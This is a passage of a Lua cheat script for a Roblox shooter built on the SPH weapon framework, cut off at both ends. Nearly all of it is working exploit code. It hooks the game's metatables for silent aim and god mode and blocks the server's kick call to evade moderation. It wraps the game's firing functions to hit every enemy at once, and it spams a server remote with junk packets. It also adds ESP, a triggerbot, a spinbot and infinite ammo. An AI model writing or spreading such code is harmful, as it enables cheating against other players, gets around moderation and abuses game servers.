getgenv().sphcleanup.playerControls = playerControls

local cfgfile = "sphcfg.json"
local cfg = {
    enabled = true, silentaim = true, showfov = true, fov = 250, teamcheck = false, wallcheck = true, target = nil,
    hitchance = 100, hitpart = "Head", targetpriority = "Closest",
    recoilmult = 0.15, nocamshake = true, infammo = true, nospread = true,
    walkspeed = 16, esp = true, fullbright = false,
    infjump = false, rapidfire = false, rapidfirerate = 800, instantreload = false,
    triggerbot = false, autobhop = false, autofarm = false, farmkills = false,
    thirdperson = false, spinbot = false, spinspeed = 15,
    antiaim = false, jitteramount = 90,
    godmode = false, crosshair = true, freecam = false, freecamspeed = 1,
    spamfire = false,
    hoveringui = false,
    theme = { accentr = 255, accentg = 255, accentb = 255 }
}

local function savecfg()
    if writefile then
        local data = {}
        for k, v in pairs(cfg) do
            if k ~= "farmkills" then
                data[k] = v
            end
        end
        pcall(function() writefile(cfgfile, hs:JSONEncode(data)) end)
    end
end

local function loadcfg()
    if readfile and isfile and isfile(cfgfile) then
        pcall(function()
            local d = hs:JSONDecode(readfile(cfgfile))
            for k, v in pairs(d) do
                if cfg[k] ~= nil and k ~= "farmkills" then
                    if k == "theme" then for tk, tv in pairs(v) do cfg.theme[tk] = tv end
                    else cfg[k] = v end
                end
            end
        end)
    end
    cfg.farmkills = false
end
loadcfg()

local function getteam(p)
    if p.Team then return p.Team end
    local a = p:GetAttribute("Team") or p:GetAttribute("team") or p:GetAttribute("TeamId") or p:GetAttribute("teamId")
    if a ~= nil then return a end
    return nil
end

local function isenemy(p)
    if not cfg.teamcheck then return true end
    local lt = getteam(lplr)
    local pt = getteam(p)
    if lt ~= nil and pt ~= nil and lt == pt then return false end
    return true
end

local function setuphl(p)
    if p == lplr then return end
    if not getgenv().sphcleanup.hls[p] then
        local h = Instance.new("Highlight")
        h.Name = "sphhl"
        h.FillTransparency = 0.5
        h.OutlineTransparency = 0
        h.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
        h.Parent = p.Character or p
        getgenv().sphcleanup.hls[p] = h
    end
end

local function updhlc(p)
    local h = getgenv().sphcleanup.hls[p]
    if h and h.Parent then
        if p.Team and p.Team.TeamColor then
            h.FillColor = p.Team.TeamColor.Color
            h.OutlineColor = p.Team.TeamColor.Color
        else
            local a = Color3.fromRGB(cfg.theme.accentr, cfg.theme.accentg, cfg.theme.accentb)
            h.FillColor = a
            h.OutlineColor = a
        end
    end
end

local function handlechar(p, c)
    if p == lplr then return end
    setuphl(p)
    local h = getgenv().sphcleanup.hls[p]
    if h then
        h.Adornee = c
        h.Parent = c
        updhlc(p)
    end
end

for _, p in ipairs(plrs:GetPlayers()) do
    if p.Character then handlechar(p, p.Character) end
    addc(p.CharacterAdded:Connect(function(c) handlechar(p, c) end))
    addc(p:GetPropertyChangedSignal("Team"):Connect(function() updhlc(p) end))
end

addc(plrs.PlayerAdded:Connect(function(p)
    addc(p.CharacterAdded:Connect(function(c) handlechar(p, c) end))
end))

addc(plrs.PlayerRemoving:Connect(function(p)
    if getgenv().sphcleanup.hls[p] then
        getgenv().sphcleanup.hls[p]:Destroy()
        getgenv().sphcleanup.hls[p] = nil
    end
end))

local uiroot
local mainFrameCached
local function overui()
    local ok, isOver = pcall(function()
        if not uiroot or not uiroot.Enabled then return false end
        if not mainFrameCached then mainFrameCached = uiroot:FindFirstChild("Main") end
        if not mainFrameCached then return false end
        local m = uin:GetMouseLocation()
        local ap = mainFrameCached.AbsolutePosition
        local as = mainFrameCached.AbsoluteSize
        return m.X >= ap.X and m.X <= ap.X + as.X and m.Y >= ap.Y and m.Y <= ap.Y + as.Y
    end)
    if ok then return isOver end
    return false
end

local function checkvis(tchar)
    local ign = {lplr.Character, tchar, cam}

    local chks = {
        tchar:FindFirstChild("TPVBodyVanillaHead") or tchar:FindFirstChild("Head"),
        tchar:FindFirstChild("UpperTorso") or tchar:FindFirstChild("Torso"),
        tchar:FindFirstChild("LowerTorso"),
        tchar:FindFirstChild("HumanoidRootPart"),
    }

    for _, part in ipairs(chks) do
        if part and part:IsA("BasePart") then
            local obs = cam:GetPartsObscuringTarget({part.Position}, ign)

            if #obs == 0 then
                return true
            end

            local blocked = false
            for _, obj in ipairs(obs) do
                if obj:IsA("Terrain") then
                    blocked = true
                    break
                else
                    local n = string.lower(obj.Name)
                    if not (n:find("grass") or n:find("bush") or n:find("leaf") or n:find("tree") or n:find("plant") or n:find("foliage")) then
                        blocked = true
                        break
                    end
                end
            end

            if not blocked then
                return true
            end
        end
    end
    return false
end

local fovcircle = Drawing.new("Circle")
fovcircle.Thickness = 1.5
fovcircle.NumSides = 60
fovcircle.Radius = cfg.fov
fovcircle.Filled = false
fovcircle.Transparency = 1
fovcircle.Color = Color3.fromRGB(255, 255, 255)
fovcircle.Visible = cfg.showfov and cfg.enabled
getgenv().sphcleanup.fov = fovcircle

local ch_top = Drawing.new("Line")
local ch_bot = Drawing.new("Line")
local ch_left = Drawing.new("Line")
local ch_right = Drawing.new("Line")
local ch_dot = Drawing.new("Circle")
ch_dot.Thickness = 1
ch_dot.NumSides = 10
ch_dot.Radius = 1
ch_dot.Filled = true
getgenv().sphcleanup.ch = {ch_top, ch_bot, ch_left, ch_right, ch_dot}

local wcache = {}
local lastwupd = 0

local function getpart(c)
    if cfg.hitpart == "Head" then return c:FindFirstChild("TPVBodyVanillaHead") or c:FindFirstChild("Head")
    elseif cfg.hitpart == "Torso" then return c:FindFirstChild("UpperTorso") or c:FindFirstChild("Torso")
    elseif cfg.hitpart == "LowerTorso" then return c:FindFirstChild("LowerTorso") or c:FindFirstChild("HumanoidRootPart")
    elseif cfg.hitpart == "Legs" then return c:FindFirstChild("LeftUpperLeg") or c:FindFirstChild("RightUpperLeg") or c:FindFirstChild("Left Leg") or c:FindFirstChild("Right Leg")
    elseif cfg.hitpart == "Arms" then return c:FindFirstChild("LeftUpperArm") or c:FindFirstChild("RightUpperArm") or c:FindFirstChild("Left Arm") or c:FindFirstChild("Right Arm")
    elseif cfg.hitpart == "Random" then
        local ps = {"TPVBodyVanillaHead", "Head", "UpperTorso", "Torso", "LowerTorso", "HumanoidRootPart", "LeftUpperLeg", "RightUpperLeg", "LeftUpperArm", "RightUpperArm"}
        local v = {}
        for _, p in ipairs(ps) do if c:FindFirstChild(p) then table.insert(v, p) end end
        if #v > 0 then return c:FindFirstChild(v[math.random(1, #v)]) end
    end
    return c:FindFirstChild("HumanoidRootPart")
end

local function findtargets()
    local list = {}
    for _, p in ipairs(plrs:GetPlayers()) do
        if p ~= lplr and isenemy(p) then
            local c = p.Character
            if c then
                local h = c:FindFirstChildOfClass("Humanoid")
                if h and h.Health > 0 then
                    local ap = getpart(c)
                    if ap then
                        table.insert(list, ap)
                    end
                end
            end
        end
    end
    return list
end

local function findtarget()
    if not cfg.enabled or cfg.hoveringui then return nil end
    local m = uin:GetMouseLocation()
    local bp = nil

    local bd = cfg.fov
    local lh = math.huge
    local hh = -math.huge
    local fd = 0

    local now = tick()
    local upd = (now - lastwupd) > 0.2
    if upd then lastwupd = now end

    for _, p in ipairs(plrs:GetPlayers()) do
        if p ~= lplr and isenemy(p) then
            local c = p.Character
            if c then
                local h = c:FindFirstChildOfClass("Humanoid")
                if h and h.Health > 0 then
                    local ap = getpart(c)
                    if ap then
                        local sp, vis = cam:WorldToViewportPoint(ap.Position)
                        if vis then
                            local dist = (Vector2.new(sp.X, sp.Y) - m).Magnitude
                            if dist < cfg.fov then
                                local iv = true
                                if cfg.wallcheck then
                                    if upd or wcache[c] == nil then wcache[c] = checkvis(c) end
                                    iv = wcache[c]
                                end

                                if iv then
                                    if cfg.targetpriority == "Closest" then
                                        if dist < bd then bd = dist; bp = ap end
                                    elseif cfg.targetpriority == "Lowest Health" then
                                        if h.Health < lh then lh = h.Health; bp = ap end
                                    elseif cfg.targetpriority == "Highest Health" then
                                        if h.Health > hh then hh = h.Health; bp = ap end
                                    elseif cfg.targetpriority == "Farthest" then
                                        if dist > fd then fd = dist; bp = ap end
                                    end
                                end
                            end
                        end
                    end
                end
            end
        end
    end

    if bp then
        local hc = tonumber(cfg.hitchance) or 100
        if math.random(1, 100) <= hc then return bp end
    end
    return nil
end

local function findtrigger()
    if not cfg.enabled or cfg.hoveringui then return nil end
    local m = uin:GetMouseLocation()
    local best = nil
    local bestd = 50

    local now = tick()
    local upd = (now - lastwupd) > 0.2
    if upd then lastwupd = now end

    for _, p in ipairs(plrs:GetPlayers()) do
        if p ~= lplr and isenemy(p) then
            local c = p.Character
            if c then
                local h = c:FindFirstChildOfClass("Humanoid")
                if h and h.Health > 0 then
                    local ap = getpart(c)
                    if ap and ap.Parent then
                        local sp, vis = cam:WorldToViewportPoint(ap.Position)
                        if vis then
                            local dist = (Vector2.new(sp.X, sp.Y) - m).Magnitude
                            if dist < bestd then
                                local iv = true
                                if cfg.wallcheck then
                                    if upd or wcache[c] == nil then wcache[c] = checkvis(c) end
                                    iv = wcache[c]
                                end
                                if iv then
                                    bestd = dist
                                    best = ap
                                end
                            end
                        end
                    end
                end
            end
        end
    end
    return best
end

newidx = newcclosure(function(self, key)
    if key ~= "WorldCFrame" then return oldidx(self, key) end
    if typeof(self) ~= "Instance" then return oldidx(self, key) end
    if self.Name ~= "Muzzle" then return oldidx(self, key) end

    local c = lplr.Character
    if not c then return oldidx(self, key) end

    local wpn = c:FindFirstChild("WeaponRig")
    local ok = false
    if self:IsDescendantOf(c) then ok = true end
    if not ok and wpn and self:IsDescendantOf(wpn) then ok = true end
    if not ok and cam and self:IsDescendantOf(cam) then ok = true end
    if not ok then return oldidx(self, key) end

    local o = oldidx(self, key)
    if not cfg.enabled or cfg.hoveringui then return o end

    -- aiming at them but pretending we're looking at the sky
    if (cfg.silentaim or cfg.farmkills) then
        local tgt = cfg.target
        if tgt and tgt.Parent and tgt:IsA("BasePart") then
            local pok, tp = pcall(function() return tgt.Position end)
            if pok and tp then
                local d = (o.Position - tp).Magnitude
                if d > 0.1 and d < 1500 then
                    return CFrame.lookAt(o.Position, tp)
                end
            else
                cfg.target = nil
            end
        end
    end

    if cfg.thirdperson then
        pcall(function()
            local m = uin:GetMouseLocation()
            local unitRay = cam:ViewportPointToRay(m.X, m.Y)
            local rp = RaycastParams.new()
            rp.FilterType = Enum.RaycastFilterType.Exclude
            local ign = {c, cam}
            if wpn then table.insert(ign, wpn) end
            local cr = cam:FindFirstChild("WeaponRig")
            if cr then table.insert(ign, cr) end
            rp.FilterDescendantsInstances = ign

            local hit = workspace:Raycast(unitRay.Origin, unitRay.Direction * 2000, rp)
            local aim = hit and hit.Position or (unitRay.Origin + unitRay.Direction * 2000)

            if (o.Position - aim).Magnitude > 0.1 then
                o = CFrame.lookAt(o.Position, aim)
            end
        end)
    end
    return o
end)

local farmfiring = false

task.spawn(function()
    local pfire
    local attempts = 0
    while getgenv().sphcleanup.active and attempts < 20 do
        attempts = attempts + 1
        for _, v in pairs(getgc(true)) do
            if type(v) == "table" and rawget(v, "_name") == "PlayerFire" then
                pfire = v
                break
            end
        end
        if pfire then break end
        task.wait(1)
    end

    if pfire then
        local mtfire = getmetatable(pfire)
        if mtfire and mtfire.Fire then
            local oldfire = mtfire.Fire
            mtfire.Fire = function(self, cframe, ...)
                if self == pfire and cfg.farmkills and cfg.enabled and not cfg.hoveringui then
                    local targs = findtargets()
                    if #targs > 0 then
                        local prev = farmfiring
                        farmfiring = true
                        for _, targ in ipairs(targs) do
                            if targ and targ.Parent then
                                local ncf = CFrame.lookAt(cframe.Position, targ.Position)
                                oldfire(self, ncf, ...)
                            end
                        end
                        farmfiring = prev
                        return
                    end
                end
                return oldfire(self, cframe, ...)
            end
        end
    end
end)

local succ, bh = pcall(function()
    local mods = rs:FindFirstChild("SPH_Assets")
    if mods then
        local m = mods:FindFirstChild("Modules")
        if m then
            local b = m:FindFirstChild("BulletHandler")
            if b then
                return require(b)
            end
        end
    end
end)

if succ and bh and bh.FireBullet then
    local oldfb = bh.FireBullet
    bh.FireBullet = function(wrig, orig, dir, vel, tool, player, tcol, isrep, ...)
        if cfg.farmkills and player == lplr and not isrep and not farmfiring then
            local targs = findtargets()
            if #targs > 0 then
                for _, targ in ipairs(targs) do
                    if targ and targ.Parent then
                        local sdir = (orig - targ.Position).Unit
                        local spos = targ.Position + sdir * 3
                        local dir2 = (targ.Position - spos).Unit
                        oldfb(wrig, spos, dir2, dir2 * vel.Magnitude, tool, player, tcol, isrep, ...)
                    end
                end
                return
            end
        end
        return oldfb(wrig, orig, dir, vel, tool, player, tcol, isrep, ...)
    end
end

newnc = newcclosure(function(self, ...)
    local m = getnamecallmethod()
    if m == "Kick" and self == lplr and not checkcaller() then return end
    if m == "Activate" and typeof(self) == "Instance" and self:IsA("Tool") and cfg.freecam then return end
    if m == "TakeDamage" and cfg.godmode then
        local ch = lplr.Character
        if ch then
            local hum = ch:FindFirstChildOfClass("Humanoid")
            if hum and self == hum then return 0 end
        end
    end
    return oldnc(self, ...)
end)

newnind = newcclosure(function(self, key, value)
    if cfg.godmode and typeof(self) == "Instance" and self:IsA("Humanoid") and self.Parent == lplr.Character then
        if key == "Health" and value < self.MaxHealth then
            return
        end
    end
    return oldnind(self, key, value)
end)

setreadonly(mt, false)
mt.__index = newidx
mt.__namecall = newnc
mt.__newindex = newnind
setreadonly(mt, true)

local spin_angle = 0
addc(rns.Heartbeat:Connect(function(dt)
    if lplr.Character then
        local h = lplr.Character:FindFirstChildOfClass("Humanoid")
        local hrp = lplr.Character:FindFirstChild("HumanoidRootPart")
        if h and hrp and h.Health > 0 then
            if cfg.spinbot then
                h.AutoRotate = false
                spin_angle = (spin_angle + math.rad(cfg.spinspeed) * (dt * 10)) % (math.pi * 2)
                hrp.CFrame = CFrame.new(hrp.Position) * CFrame.Angles(0, spin_angle, 0)
                hrp.AssemblyAngularVelocity = Vector3.zero
            elseif cfg.antiaim then
                h.AutoRotate = false
                local base = CFrame.new(hrp.Position)
                local angle = math.sin(tick() * 20) * math.rad(cfg.jitteramount)
                hrp.CFrame = base * CFrame.Angles(0, angle, 0)
                hrp.AssemblyAngularVelocity = Vector3.zero
            else
                h.AutoRotate = true
            end
        end
    end
end))

-- health go brrrrrr
addc(rns.Heartbeat:Connect(function()
    if cfg.godmode and lplr.Character then
        local h = lplr.Character:FindFirstChildOfClass("Humanoid")
        local hrp = lplr.Character:FindFirstChild("HumanoidRootPart")
        if h and hrp then
            if h.Health < h.MaxHealth then h.Health = h.MaxHealth end
            if h.FloorMaterial == Enum.Material.Air and hrp.Velocity.Y < -50 then
                hrp.Velocity = Vector3.new(hrp.Velocity.X, 50, hrp.Velocity.Z)
            end
            local f = lplr.Character:FindFirstChildOfClass("ForceField")
            if not f then
                local nf = Instance.new("ForceField", lplr.Character)
                nf.Visible = false
            end
            local sp = lplr.Character:FindFirstChild("SPH_Character")
            if sp then
                local fd = sp:FindFirstChild("FallDamage")
                if fd then fd:Destroy() end
            end
        end
    end
end))

local lastTool = false
local freecamActive = false
local freecamCFrame = CFrame.new()
local currentYaw = 0
local currentPitch = 0

addc(rns.RenderStepped:Connect(function(dt)
    local c = lplr.Character
    local hasTool = c and c:FindFirstChildWhichIsA("Tool") ~= nil

    if getgenv().sphui_state then
        for k, v in pairs(getgenv().sphui_state) do
            if k ~= "theme" then
                cfg[k] = v
            end
        end
        cfg.theme = getgenv().sphui_state.theme
    end

    if cfg.freecam then
        if not freecamActive then
            freecamActive = true
            freecamCFrame = cam.CFrame
            local rx, ry, rz = freecamCFrame:ToEulerAnglesYXZ()
            currentPitch = rx
            currentYaw = ry
            if playerControls then pcall(function() playerControls:Disable() end) end
        end
        
        if overui() then
            uin.MouseBehavior = Enum.MouseBehavior.Default
            uin.MouseIconEnabled = true
        else
            uin.MouseBehavior = Enum.MouseBehavior.LockCenter
            uin.MouseIconEnabled = false
            
            local delta = uin:GetMouseDelta()
            currentYaw = currentYaw - math.rad(delta.X * 2.5)
            currentPitch = math.clamp(currentPitch - math.rad(delta.Y * 0.15), -math.rad(89), math.rad(89))
            
            local rot = CFrame.fromEulerAnglesYXZ(currentPitch, currentYaw, 0)
            local moveDir = Vector3.zero
            if uin:IsKeyDown(Enum.KeyCode.W) then moveDir += rot.LookVector end
            if uin:IsKeyDown(Enum.KeyCode.S) then moveDir -= rot.LookVector end
            if uin:IsKeyDown(Enum.KeyCode.A) then moveDir -= rot.RightVector end
            if uin:IsKeyDown(Enum.KeyCode.D) then moveDir += rot.RightVector end
            if uin:IsKeyDown(Enum.KeyCode.Q) then moveDir -= Vector3.new(0, 1, 0) end
            if uin:IsKeyDown(Enum.KeyCode.E) then moveDir += Vector3.new(0, 1, 0) end
            if uin:IsMouseButtonPressed(Enum.UserInputType.MouseButton1) then moveDir += rot.LookVector end

            local speed = (cfg.freecamspeed or 1) * (uin:IsKeyDown(Enum.KeyCode.LeftShift) and 3 or 1)
            freecamCFrame = CFrame.new(freecamCFrame.Position + moveDir * speed * dt * 60) * rot
            cam.CFrame = freecamCFrame
            cam.CameraType = Enum.CameraType.Scriptable
        end
    else
        if freecamActive then
            freecamActive = false
            cam.CameraType = Enum.CameraType.Custom
            if playerControls then pcall(function() playerControls:Enable() end) end
            uin.MouseBehavior = Enum.MouseBehavior.Default
            uin.MouseIconEnabled = true
            if lplr.Character and lplr.Character:FindFirstChild("Humanoid") then
                cam.CameraSubject = lplr.Character.Humanoid
            end
        end

        if cfg.thirdperson then
            if lplr.CameraMode ~= Enum.CameraMode.Classic then
                lplr.CameraMode = Enum.CameraMode.Classic
            end
            if lplr.CameraMaxZoomDistance < 20 then lplr.CameraMaxZoomDistance = 20 end
            if lplr.CameraMinZoomDistance > 0.5 then lplr.CameraMinZoomDistance = 0.5 end
        else
            if hasTool then
                if lplr.CameraMode ~= Enum.CameraMode.LockFirstPerson then
                    lplr.CameraMode = Enum.CameraMode.LockFirstPerson
                end
                if lplr.CameraMaxZoomDistance > 0.5 then lplr.CameraMaxZoomDistance = 0.5 end
                if lplr.CameraMinZoomDistance > 0.5 then lplr.CameraMinZoomDistance = 0.5 end
            elseif lastTool and not hasTool then
                if lplr.CameraMode == Enum.CameraMode.LockFirstPerson then
                    lplr.CameraMode = Enum.CameraMode.Classic
                end
                lplr.CameraMaxZoomDistance = 128
                lplr.CameraMinZoomDistance = 0.5
            end
        end
    end
    lastTool = hasTool
end))

addc(rns.Heartbeat:Connect(function()
    if lplr.Character and lplr.Character:FindFirstChildOfClass("Humanoid") then
        local h = lplr.Character.Humanoid
        if cfg.infjump or cfg.autobhop then
            if h.FloorMaterial ~= Enum.Material.Air then h:ChangeState(Enum.HumanoidStateType.Jumping) end
        end
    end
end))

local function click()
    local vim = game:GetService("VirtualInputManager")
    if vim then
        pcall(function()
            vim:SendMouseButtonEvent(0, 0, 0, true, game, 1)
            task.wait(0.01)
            vim:SendMouseButtonEvent(0, 0, 0, false, game, 1)
        end)
    end

    if type(mouse1click) == "function" then
        pcall(mouse1click)
    elseif type(mouse1press) == "function" and type(mouse1release) == "function" then
        pcall(mouse1press)
        task.wait(0.01)
        pcall(mouse1release)
    end

    local c = lplr.Character
    if c then
        local t = c:FindFirstChildWhichIsA("Tool")
        if t then pcall(function() t:Activate() end) end
    end
    return nil
end

local function forceammo()
    if not lplr.Character then return end
    local t = lplr.Character:FindFirstChildWhichIsA("Tool")
    if not t or not t:FindFirstChild("SPH_Weapon") then return end
    local a = t:FindFirstChild("Ammo")
    if not a then return end
    local m = a:FindFirstChild("MagAmmo")
    local p = a:FindFirstChild("ArcadeAmmoPool")
    if m and m.Value < m.MaxValue then m.Value = m.MaxValue end
    if p and p.Value < 9999 then p.Value = 9999 end
    return nil
end

task.spawn(function()
    while getgenv().sphcleanup.active and task.wait(0.05) do
        if cfg.triggerbot and not cfg.hoveringui and lplr.Character and not cfg.farmkills then
            local targ = findtrigger()
            if targ and targ.Parent then
                local c = lplr.Character
                if c then
                    local t = c:FindFirstChildWhichIsA("Tool")
                    if t then click() end
                end
            end
        end
    end
end)

task.spawn(function()
    while getgenv().sphcleanup.active and task.wait(0.2) do
        if cfg.autofarm and not cfg.hoveringui and not cfg.farmkills then
            pcall(function()
                local c = lplr.Character
                if c and c:FindFirstChild("HumanoidRootPart") then
                    local tool = c:FindFirstChildWhichIsA("Tool")

                    if not tool then
                        local bp = lplr:FindFirstChild("Backpack")
                        if bp then
                            for _, item in ipairs(bp:GetChildren()) do
                                if item:IsA("Tool") then
                                    item.Parent = c
                                    task.wait(0.1)
                                    tool = item
                                    break
                                end
                            end
                        end
                    end

                    for _, p in ipairs(plrs:GetPlayers()) do
                        if p ~= lplr and p.Character and p.Character:FindFirstChild("HumanoidRootPart") then
                            local eh = p.Character:FindFirstChildOfClass("Humanoid")
                            if eh and eh.Health > 0 and isenemy(p) then
                                local tpos = p.Character.HumanoidRootPart.Position + (p.Character.HumanoidRootPart.CFrame.LookVector * -3) + Vector3.new(0, 1, 0)
                                c:PivotTo(CFrame.lookAt(tpos, p.Character.HumanoidRootPart.Position))
                                task.wait(0.05)
                                if tool then click() end
                                break
                            end
                        end
                    end
                end
            end)
        end
    end
end)

task.spawn(function()
    local bn
    local s, r = pcall(function() return require(rs:WaitForChild("SPH_Assets"):WaitForChild("Modules"):WaitForChild("BridgeNet")) end)
    if s then bn = r end
    local rb
    if bn then
        pcall(function() rb = bn.CreateBridge("Reload") end)
    end

    while getgenv().sphcleanup.active and task.wait(0.1) do
        if cfg.farmkills and not cfg.hoveringui and lplr.Character then
            local c = lplr.Character
            local tool = c:FindFirstChildWhichIsA("Tool")

            if not tool then
                local bp = lplr:FindFirstChild("Backpack")
                if bp then
                    for _, item in ipairs(bp:GetChildren()) do
                        if item:IsA("Tool") then
                            item.Parent = c
                            task.wait(0.1)
                            tool = item
                            break
                        end
                    end
                end
            end

            if tool then
                forceammo()
                if rb then pcall(function() rb:Fire() end) end
                task.wait(0.02)
                forceammo()
                click()
                task.wait(0.05)
            end
        end
    end
end)

task.spawn(function()
    local bn
    local s, r = pcall(function() return require(rs:WaitForChild("SPH_Assets"):WaitForChild("Modules"):WaitForChild("BridgeNet")) end)
    if s then bn = r end
    local rb
    if bn then
        pcall(function() rb = bn.CreateBridge("Reload") end)
    end

    while getgenv().sphcleanup.active and task.wait(0.15) do
        if cfg.infammo and lplr.Character then
            local t = lplr.Character:FindFirstChildWhichIsA("Tool")
            if t and t:FindFirstChild("SPH_Weapon") then
                local a = t:FindFirstChild("Ammo")
                if a then
                    local m = a:FindFirstChild("MagAmmo")
                    local p = a:FindFirstChild("ArcadeAmmoPool")
                    if m and m.Value < m.MaxValue then m.Value = m.MaxValue end
                    if p and p.Value < 9999 then p.Value = 9999 end
                    if rb then pcall(function() rb:Fire() end) end
                end
            end
        end
    end
end)

-- bridge spoofer, let's send garbage to the server and see if it cries
task.spawn(function()
    local autoSerde = rs:WaitForChild("AutoSerde", 10)
    local remote = rs:FindFirstChild("SPH_BridgeNetEvent")
    if not autoSerde or not remote then return end

    local function getId(name)
        local v = autoSerde:FindFirstChild(name)
        return v and v.Value or nil
    end

    local bodyId = getId("BodyAnimRequest")

    if not bodyId then return end

    while getgenv().sphcleanup and getgenv().sphcleanup.active do
        if cfg.spamfire then
            task.wait(0.03)
            local t = tick()
            local spin = math.sin(t * 15) * 180
            local wobble = math.cos(t * 10) * 45
            local cf = CFrame.new(math.random(-3,3), -0.5, math.random(-3,3)) * CFrame.Angles(math.rad(wobble), math.rad(spin), math.rad(wobble))
            pcall(function()
                remote:FireServer({ { bodyId, cf } })
            end)
        else
            task.wait(1)
        end
    end
end)

local lastThemeCol = nil
addc(rns.Heartbeat:Connect(function()
    local col = Color3.fromRGB(cfg.theme.accentr, cfg.theme.accentg, cfg.theme.accentb)
    local themeChanged = col ~= lastThemeCol
    if themeChanged then lastThemeCol = col end
    for p, h in pairs(getgenv().sphcleanup.hls) do
        if h then
            if cfg.esp then
                h.Enabled = true
                if themeChanged then updhlc(p) end
            else
                h.Enabled = false
            end
        end
    end
end))

addc(rns.RenderStepped:Connect(function()
    if not cfg.enabled then
        fovcircle.Visible = false
        for _, d in pairs(getgenv().sphcleanup.ch) do d.Visible = false end
        uin.MouseIconEnabled = true
        return
    end
    local m = uin:GetMouseLocation()

    cfg.hoveringui = overui()

    if cfg.hoveringui or cfg.freecam then
        uin.MouseIconEnabled = true
    else
        uin.MouseIconEnabled = false
    end

    if cfg.farmkills then
        local targs = findtargets()
        if #targs > 0 then
            cfg.target = targs[1]
        else
            cfg.target = nil
        end
    else
        if cfg.target and not cfg.target.Parent then cfg.target = nil end
        cfg.target = not cfg.hoveringui and findtarget() or nil
    end

    fovcircle.Position = m
    fovcircle.Radius = cfg.fov
    fovcircle.Visible = cfg.showfov and cfg.enabled and not cfg.hoveringui

    if cfg.hoveringui then
        fovcircle.Color = Color3.fromRGB(255, 50, 50)
    elseif cfg.target then
        fovcircle.Color = Color3.fromRGB(0, 255, 0)
    else
        fovcircle.Color = Color3.fromRGB(255, 255, 255)
    end

    if cfg.crosshair and not cfg.hoveringui and not cfg.freecam then
        local cx = m.X
        local cy = m.Y
        local col = cfg.target and Color3.fromRGB(0, 255, 0) or Color3.fromRGB(255, 255, 255)

        ch_top.Visible = true
        ch_top.From = Vector2.new(cx, cy - 10)
        ch_top.To = Vector2.new(cx, cy - 3)
        ch_top.Color = col

        ch_bot.Visible = true
        ch_bot.From = Vector2.new(cx, cy + 3)
        ch_bot.To = Vector2.new(cx, cy + 10)
        ch_bot.Color = col

        ch_left.Visible = true
        ch_left.From = Vector2.new(cx - 10, cy)
        ch_left.To = Vector2.new(cx - 3, cy)
        ch_left.Color = col

        ch_right.Visible = true
        ch_right.From = Vector2.new(cx + 3, cy)
        ch_right.To = Vector2.new(cx + 10, cy)
        ch_right.Color = col

        ch_dot.Visible = true
        ch_dot.Position = Vector2.new(cx, cy)
        ch_dot.Color = col
    else
        for _, d in pairs(getgenv().sphcleanup.ch) do d.Visible = false end
    end
end))

addc(rns.Heartbeat:Connect(function()
    if not getgenv().sphcleanup.active then return end
    if cfg.fullbright then
        lgt.Ambient = Color3.fromRGB(255, 255, 255); lgt.OutdoorAmbient = Color3.fromRGB(255, 255, 255)
        lgt.Brightness = 2; lgt.ClockTime = 12
    end
    if lplr.Character and lplr.Character:FindFirstChildOfClass("Humanoid") then
        if not cfg.freecam then
            lplr.Character.Humanoid.WalkSpeed = cfg.walkspeed
        else
            lplr.Character.Humanoid.WalkSpeed = 0
        end
    end
end))

local function modstats(c)
    if not c then return end
    for _, v in pairs(c:GetDescendants()) do
        if v.Name == "WeaponStats" and v:IsA("ModuleScript") then
            local s, stat = pcall(require, v)
            if s and type(stat) == "table" then
                if stat.recoil then
                    if not stat.recoil._orig then stat.recoil._orig = {vertical = stat.recoil.vertical or 1, horizontal = stat.recoil.horizontal or 1, camShake = stat.recoil.camShake or 0} end
                    stat.recoil.vertical = stat.recoil._orig.vertical * cfg.recoilmult
                    stat.recoil.horizontal = stat.recoil._orig.horizontal * cfg.recoilmult
                    stat.recoil.camShake = cfg.nocamshake and 0 or stat.recoil._orig.camShake
                end
                if stat.gunRecoil then
                    if not stat.gunRecoil._orig then stat.gunRecoil._orig = {vertical = stat.gunRecoil.vertical or 1, horizontal = stat.gunRecoil.horizontal or 1, punchMultiplier = stat.gunRecoil.punchMultiplier or 0} end
                    stat.gunRecoil.vertical = stat.gunRecoil._orig.vertical * cfg.recoilmult
                    stat.gunRecoil.horizontal = stat.gunRecoil._orig.horizontal * cfg.recoilmult
                    stat.gunRecoil.punchMultiplier = stat.gunRecoil._orig.punchMultiplier * cfg.recoilmult
                end
                if cfg.nospread then stat.spread = 0 end
                if cfg.instantreload then stat.reloadSpeedModifier = 100 end
                if not stat._origfire then stat._origfire = stat.fireRate end
                if cfg.rapidfire then stat.fireRate = cfg.rapidfirerate else stat.fireRate = stat._origfire end
            end
        end
    end
    return nil
end

local function charsetup(c)
    task.wait(1)
    if not getgenv().sphcleanup.active then return end
    modstats(c)
    c.ChildAdded:Connect(function(ch) if ch:IsA("Tool") then task.wait(0.5); modstats(c) end end)
    return nil
end
addc(lplr.CharacterAdded:Connect(charsetup))
if lplr.Character then task.spawn(function() charsetup(lplr.Character) end) end

local function getgui()
    if gethui then local ok, res = pcall(gethui); if ok and res then return res end end
    return pcall(function() return game:GetService("CoreGui") end) and game:GetService("CoreGui") or lplr:WaitForChild("PlayerGui")
end

-- alright, the ui. thank the based ui god for this one.
-- ignore the 180 UICorner instances, they are load-bearing
local SPHUI = {
    SPHUI = Instance.new("ScreenGui"),
    Main = Instance.new("Frame"),
    MainScale = Instance.new("UIScale"),
    Top = Instance.new("Frame"),
    Title = Instance.new("TextLabel"),
    Accent = Instance.new("Frame"),
    GlossGradient = Instance.new("UIGradient"),
    MinBtn = Instance.new("TextButton"),
    BtnGradient = Instance.new("UIGradient"),
    UICorner = Instance.new("UICorner"),
    BarGradient = Instance.new("UIGradient"),
    Side = Instance.new("Frame"),
    NavLabel = Instance.new("TextLabel"),
    Divider = Instance.new("Frame"),
    TabIndicator = Instance.new("Frame"),
    IndicatorGradient = Instance.new("UIGradient"),
    UICorner_2 = Instance.new("UICorner"),
    TabAim = Instance.new("TextButton"),
    UICorner_3 = Instance.new("UICorner"),
    TabWep = Instance.new("TextButton"),
    UICorner_4 = Instance.new("UICorner"),
    TabVis = Instance.new("TextButton"),
    UICorner_5 = Instance.new("UICorner"),
    TabExp = Instance.new("TextButton"),
    UICorner_6 = Instance.new("UICorner"),
    TabThm = Instance.new("TextButton"),
    UICorner_7 = Instance.new("UICorner"),
    Content = Instance.new("Frame"),
    Head = Instance.new("TextLabel"),
    Sub = Instance.new("TextLabel"),
    PgAim = Instance.new("ScrollingFrame"),
    UIListLayout = Instance.new("UIListLayout"),
